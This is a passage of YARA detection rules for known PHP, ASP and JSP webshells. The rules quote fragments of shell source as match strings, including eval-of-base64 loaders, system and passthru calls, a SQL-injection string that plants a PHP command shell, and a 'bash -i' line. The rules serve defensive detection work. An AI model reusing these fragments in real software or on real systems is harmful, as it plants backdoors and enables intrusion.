T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \" $aa = $_GET['aa'];\" \n      $s1 = \"echo $aa;\" \n   condition: \n      all of them\n}\n\nrule FSO_s_sincap_RID2BA8 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file sincap.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 09:15:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"    <font color=\\\"#E5E5E5\\\" style=\\\"font-size: 8pt; font-weight: 700\\\" face=\\\"Arial\\\">\" \n      $s4 = \"<body text=\\\"#008000\\\" bgcolor=\\\"#808080\\\" topmargin=\\\"0\\\" leftmargin=\\\"0\\\" rightmargin=\" \n   condition: \n      all of them\n}\n\nrule Webshell_PhpShell_1_RID2E56 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file PhpShell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:10:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"href=\\\"http://www.gimpster.com/wiki/PhpShell\\\">www.gimpster.com/wiki/PhpShell</a>.\" \n   condition: \n      all of them\n}\n\nrule Webshell_HYTop_DevPack_config_RID324C : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file config.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 13:59:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"const adminPassword=\\\"\" \n      $s2 = \"const userPassword=\\\"\" \n      $s3 = \"const mVersion=\" \n   condition: \n      all of them\n}\n\nrule Webshell_FSO_s_zehir4_RID2F15 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file zehir4.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:42:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \" byMesaj \" \n   condition: \n      all of them\n}\n\nrule Webshell_iMHaPFtp_RID2D7F : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file iMHaPFtp.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 10:34:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"echo \\\"\\\\t<th class=\\\\\\\"permission_header\\\\\\\"><a href=\\\\\\\"$self?{$d}sort=permission$r\\\\\\\">\" \n   condition: \n      all of them\n}\n\nrule Webshell_Unpack_TBack_RID2F2C : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file TBack.dll\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:45:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"\\\\final\\\\new\\\\lcc\\\\public.dll\" \n   condition: \n      all of them\n}\n\nrule Webshell_DarkSpy105_RID2DFA : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file DarkSpy105.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 10:54:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"Sorry,DarkSpy got an unknown exception,please re-run it,thanks!\" \n   condition: \n      all of them\n}\n\nrule Webshell_FSO_s_reader_RID2F32 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file reader.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:46:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"mailto:mailbomb@hotmail.\" \n   condition: \n      all of them\n}\n\nrule Webshell_KA_uShell_RID2DFE : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file KA_uShell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 10:55:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"if(empty($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW']<>$pass\" \n      $s6 = \"if ($_POST['path']==\\\"\\\"){$uploadfile = $_FILES['file']['name'];}\" \n   condition: \n      all of them\n}\n\nrule Webshell_PHP_Backdoor_v1_RID3018 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file PHP Backdoor v1.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 12:25:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"echo\\\"<form method=\\\\\\\"POST\\\\\\\" action=\\\\\\\"\\\".$_SERVER['PHP_SELF'].\\\"?edit=\\\".$th\" \n      $s8 = \"echo \\\"<a href=\\\\\\\"\\\".$_SERVER['PHP_SELF'].\\\"?proxy\" \n   condition: \n      all of them\n}\n\nrule HYTop_DevPack_server_RID2ED8 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file server.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:31:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<!-- PageServer Below -->\" \n   condition: \n      all of them\n}\n\nrule saphpshell_RID2B45 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file saphpshell_RID2B45.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 08:59:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<td><input type=\\\"text\\\" name=\\\"command\\\" size=\\\"60\\\" value=\\\"<?=$_POST['command']?>\" \n   condition: \n      all of them\n}\n\nrule HYTop2006_rar_Folder_2006Z_RID2F8D : DEMO T1505_003 T1543_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file 2006Z.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 12:02:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, T1543_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"wangyong,czy,allen,lcx,Marcos,kEvin1986,myth\" \n      $s8 = \"System\\\\CurrentControlSet\\\\Control\\\\Keyboard Layouts\\\\%.8x\" \n   condition: \n      all of them\n}\n\nrule Webshell_admin_ad_RID2DD3 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file admin-ad.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 10:48:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"<td align=\\\"center\\\"> <input name=\\\"cmd\\\" type=\\\"text\\\" id=\\\"cmd\\\" siz\" \n      $s7 = \"Response.write\\\"<a href='\\\"&url&\\\"?path=\\\"&Request(\\\"oldpath\\\")&\\\"&attrib=\\\"&attrib&\\\"'><\" \n   condition: \n      all of them\n}\n\nrule Webshell_FSO_s_casus15_RID2F44 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file casus15.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:49:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"if((is_dir(\\\"$deldir/$file\\\")) AND ($file!=\\\".\\\") AND ($file!=\\\"..\\\"))\" \n   condition: \n      all of them\n}\n\nrule WebShell_toolaspshell_RID2FA0 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file toolaspshell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 12:05:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"cprthtml = \\\"<font face='arial' size='1'>RHTOOLS 1.5 BETA(PVT) Edited By KingDef\" \n      $s1 = \"barrapos = CInt(InstrRev(Left(raiz,Len(raiz) - 1),\\\"\\\\\\\")) - 1\" fullword\n      $s2 = \"destino3 = folderItem.path & \\\"\\\\index.asp\\\"\" fullword\n   condition: \n      2 of them\n}\n\nrule WebShell_b374k_mini_shell_php_php_RID33C2 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file b374k-mini-shell-php.php.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 15:01:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"@error_reporting(0);\" fullword\n      $s2 = \"@eval(gzinflate(base64_decode($code)));\" fullword\n      $s3 = \"@set_time_limit(0); \" fullword\n   condition: \n      all of them\n}\n\nrule WebShell_Sincap_1_0_RID2E03 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file Sincap 1.0.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 10:56:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"</font></span><a href=\\\"mailto:shopen@aventgrup.net\\\">\" fullword\n      $s5 = \"<title>:: AventGrup ::.. - Sincap 1.0 | Session(Oturum) B\" fullword\n      $s9 = \"</span>Avrasya Veri ve NetWork Teknolojileri Geli\" fullword\n      $s12 = \"while (($ekinci=readdir ($sedat))){\" fullword\n      $s19 = \"$deger2= \\\"$ich[$tampon4]\\\";\" fullword\n   condition: \n      2 of them\n}\n\nrule WebShell_b374k_php_RID2D98 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file b374k.php.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 10:38:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"// encrypt your password to md5 here http://kerinci.net/?x=decode\" fullword\n      $s6 = \"// password (default is: b374k)\" \n      $s8 = \"//******************************************************************************\" \n      $s9 = \"// b374k 2.2\" fullword\n      $s10 = \"eval(\\\"?>\\\".gzinflate(base64_decode(\" \n   condition: \n      3 of them\n}\n\nrule WEBSHELL_H4ntu_Shell_Powered_Tsoi_2_RID33B4 : DEMO SCRIPT T1033 T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file h4ntu shell [powered by tsoi].php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 14:59:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2025-03-21\"\n      tags = \"DEMO, SCRIPT, T1033, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<title>h4ntu shell [powered by tsoi]</title>\" fullword\n      $s2 = \"$uname = posix_uname( );\" fullword\n      $s3 = \"if(!$whoami)$whoami=exec(\\\"whoami\\\");\" fullword\n      $s4 = \"echo \\\"<p><font size=2 face=Verdana><b>This Is The Server Information</b></font>\" \n   condition: \n      filesize < 2MB and 2 of them\n}\n\nrule WebShell_php_webshells_MyShell_RID3313 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file MyShell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 14:32:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"<title>MyShell error - Access Denied</title>\" fullword\n      $s4 = \"$adminEmail = \\\"youremail@yourserver.com\\\";\" fullword\n      $s5 = \"//A workdir has been asked for - we chdir to that dir.\" fullword\n      $s6 = \"system($command . \\\" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o\" \n      $s13 = \"#$autoErrorTrap Enable automatic error traping if command returns error.\" fullword\n      $s14 = \"/* No work_dir - we chdir to $DOCUMENT_ROOT */\" fullword\n      $s19 = \"#every command you excecute.\" fullword\n      $s20 = \"<form name=\\\"shell\\\" method=\\\"post\\\">\" fullword\n   condition: \n      3 of them\n}\n\nrule WebShell_php_webshells_pHpINJ_RID325E : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file pHpINJ.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 14:02:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';\" fullword\n      $s10 = \"<form action = \\\"<?php echo \\\"$_SERVER[PHP_SELF]\\\" ; ?>\\\" method = \\\"post\\\">\" fullword\n      $s11 = \"$sql = \\\"0' UNION SELECT '0' , '<? system(\\\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 IN\" \n      $s13 = \"Full server path to a writable file which will contain the Php Shell <br />\" fullword\n      $s14 = \"$expurl= $url.\\\"?id=\\\".$sql ;\" fullword\n      $s15 = \"<header>||   .::News PHP Shell Injection::.   ||</header> <br /> <br />\" fullword\n      $s16 = \"<input type = \\\"submit\\\" value = \\\"Create Exploit\\\"> <br /> <br />\" fullword\n   condition: \n      1 of them\n}\n\nrule WebShell_ru24_post_sh_RID2F32 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file ru24_post_sh.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:46:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"http://www.ru24-team.net\" fullword\n      $s4 = \"if ((!$_POST['cmd']) || ($_POST['cmd']==\\\"\\\")) { $_POST['cmd']=\\\"id;pwd;uname -a\" \n      $s6 = \"Ru24PostWebShell\" \n      $s7 = \"Writed by DreAmeRz\" fullword\n      $s9 = \"$function=passthru; // system, exec, cmd\" fullword\n   condition: \n      1 of them\n}\n\nrule WebShell_c99_locus7s_RID2E8A : DEMO T1087_001 T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file c99_locus7s.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:18:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1087_001, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s8 = \"$encoded = base64_encode(file_get_contents($d.$f)); \" fullword\n      $s9 = \"$file = $tmpdir.\\\"dump_\\\".getenv(\\\"SERVER_NAME\\\").\\\"_\\\".$db.\\\"_\\\".date(\\\"d-m-Y\" \n      $s10 = \"else {$tmp = htmlspecialchars(\\\"./dump_\\\".getenv(\\\"SERVER_NAME\\\").\\\"_\\\".$sq\" \n      $s11 = \"$c99sh_sourcesurl = \\\"http://locus7s.com/\\\"; //Sources-server \" fullword\n      $s19 = \"$nixpwdperpage = 100; // Get first N lines from /etc/passwd \" fullword\n   condition: \n      2 of them\n}\n\nrule WebShell_JspWebshell_1_2_RID300A : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file JspWebshell_1.2.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 12:22:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"System.out.println(\\\"CreateAndDeleteFolder is error:\\\"+ex); \" fullword\n      $s1 = \"String password=request.getParameter(\\\"password\\\");\" fullword\n      $s3 = \"<%@ page contentType=\\\"text/html; charset=GBK\\\" language=\\\"java\\\" import=\\\"java.\" \n      $s7 = \"String editfile=request.getParameter(\\\"editfile\\\");\" fullword\n      $s8 = \"//String tempfilename=request.getParameter(\\\"file\\\");\" fullword\n      $s12 = \"password = (String)session.getAttribute(\\\"password\\\");\" fullword\n   condition: \n      3 of them\n}\n\nrule WebShell_cgitelnet_RID2E45 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file cgitelnet.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:07:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s9 = \"# Author Homepage: http://www.rohitab.com/\" fullword\n      $s10 = \"elsif($Action eq \\\"command\\\") # user wants to run a command\" fullword\n      $s18 = \"# in a command line on Windows NT.\" fullword\n      $s20 = \"print \\\"Transfered $TargetFileSize Bytes.<br>\\\";\" fullword\n   condition: \n      2 of them\n}\n\nrule WebShell_lamashell_RID2E39 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file lamashell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:05:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"if(($_POST['exe']) == \\\"Execute\\\") {\" fullword\n      $s8 = \"$curcmd = $_POST['king'];\" fullword\n      $s16 = \"\\\"http://www.w3.org/TR/html4/loose.dtd\\\">\" fullword\n      $s18 = \"<title>lama's'hell v. 3.0</title>\" fullword\n      $s19 = \"_|_  O    _    O  _|_\" \n      $s20 = \"$curcmd = \\\"ls -lah\\\";\" fullword\n   condition: \n      2 of them\n}\n\nrule WebShell_AK_74_Security_Team_Web_Shell_Beta_Version_RID3A6D : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file AK-74 Security Team Web Shell Beta Version.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 19:46:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s8 = \"- AK-74 Security Team Web Site: www.ak74-team.net\" fullword\n      $s9 = \"<b><font color=#830000>8. X Forwarded For IP - </font></b><font color=#830000>'.\" \n      $s10 = \"<b><font color=#83000>Execute system commands!</font></b>\" fullword\n   condition: \n      1 of them\n}\n\nrule WebShell_STNC_WebShell_v0_8_RID30CF : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file STNC WebShell v0.8.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 12:55:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"if(isset($_POST[\\\"action\\\"])) $action = $_POST[\\\"action\\\"];\" fullword\n      $s8 = \"elseif(fe(\\\"system\\\")){ob_start();system($s);$r=ob_get_contents();ob_end_clean()\" \n      $s13 = \"{ $pwd = $_POST[\\\"pwd\\\"]; $type = filetype($pwd); if($type === \\\"dir\\\")chdir($pw\" \n   condition: \n      2 of them\n}\n\nrule WebShell_Web_shell__c_ShAnKaR_RID3203 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file Web-shell (c)ShAnKaR.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 13:47:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"header(\\\"Content-Length: \\\".filesize($_POST['downf']));\" fullword\n      $s5 = \"if($_POST['save']==0){echo \\\"<textarea cols=70 rows=10>\\\".htmlspecialchars($dump\" \n      $s6 = \"write(\\\"#\\\\n#Server : \\\".getenv('SERVER_NAME').\\\"\" fullword\n      $s12 = \"foreach(@file($_POST['passwd']) as $fed)echo $fed;\" fullword\n   condition: \n      2 of them\n}\n\nrule WebShell_Gamma_Web_Shell_RID303D : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file Gamma Web Shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 12:31:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"$ok_commands = ['ls', 'ls -l', 'pwd', 'uptime'];\" fullword\n      $s8 = \"### Gamma Group <http://www.gammacenter.com>\" fullword\n      $s15 = \"my $error = \\\"This command is not available in the restricted mode.\\\\n\\\";\" fullword\n      $s20 = \"my $command = $self->query('command');\" fullword\n   condition: \n      2 of them\n}\n\nrule WebShell_php_webshells_aspydrv_RID335E : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file aspydrv.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 14:44:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Target = \\\"D:\\\\hshome\\\\masterhr\\\\masterhr.com\\\\\\\"  ' ---Directory to which files\" \n      $s1 = \"nPos = InstrB(nPosEnd, biData, CByteString(\\\"Content-Type:\\\"))\" fullword\n      $s3 = \"Document.frmSQL.mPage.value = Document.frmSQL.mPage.value - 1\" fullword\n      $s17 = \"If request.querystring(\\\"getDRVs\\\")=\\\"@\\\" then\" fullword\n      $s20 = \"' ---Copy Too Folder routine Start\" fullword\n   condition: \n      3 of them\n}\n\nrule WebShell_JspWebshell_1_2_2_RID309B : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file JspWebshell 1.2.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 12:47:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"System.out.println(\\\"CreateAndDeleteFolder is error:\\\"+ex); \" fullword\n      $s3 = \"<%@ page contentType=\\\"text/html; charset=GBK\\\" language=\\\"java\\\" import=\\\"java.\" \n      $s4 = \"// String tempfilepath=request.getParameter(\\\"filepath\\\");\" fullword\n      $s15 = \"endPoint=random1.getFilePointer();\" fullword\n      $s20 = \"if (request.getParameter(\\\"command\\\") != null) {\" fullword\n   condition: \n      3 of them\n}\n\nrule WebShell_g00nshell_v1_3_RID2F6B : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file g00nshell-v1.3.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:56:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s10 = \"#To execute commands, simply include ?cmd=___ in the url. #\" fullword\n      $s15 = \"$query = \\\"SHOW COLUMNS FROM \\\" . $_GET['table'];\" fullword\n      $s16 = \"$uakey = \\\"724ea055b975621b9d679f7077257bd9\\\"; // MD5 encoded user-agent\" fullword\n      $s17 = \"echo(\\\"<form method='GET' name='shell'>\\\");\" fullword\n      $s18 = \"echo(\\\"<form method='post' action='?act=sql'>\\\");\" fullword\n   condition: \n      2 of them\n}\n\nrule WebShell_php_include_w_shell_RID325E : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file php-include-w-shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 14:02:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s13 = \"# dump variables (DEBUG SCRIPT) NEEDS MODIFINY FOR B64 STATUS!!\" fullword\n      $s17 = \"\\\"phpshellapp\\\" => \\\"export TERM=xterm; bash -i\\\",\" fullword\n      $s19 = \"else if($numhosts == 1) $strOutput .= \\\"On 1 host..\\\\n\\\";\" fullword\n   condition: \n      1 of them\n}\n\nrule WebShell_PhpSpy_Ver_2006_RID2F9D : DEMO T1007 T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file PhpSpy Ver 2006.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 12:04:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1007, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"var_dump(@$shell->RegRead($_POST['readregname']));\" fullword\n      $s12 = \"$prog = isset($_POST['prog']) ? $_POST['prog'] : \\\"/c net start > \\\".$pathname.\" \n      $s19 = \"$program = isset($_POST['program']) ? $_POST['program'] : \\\"c:\\\\winnt\\\\system32\" \n      $s20 = \"$regval = isset($_POST['regval']) ? 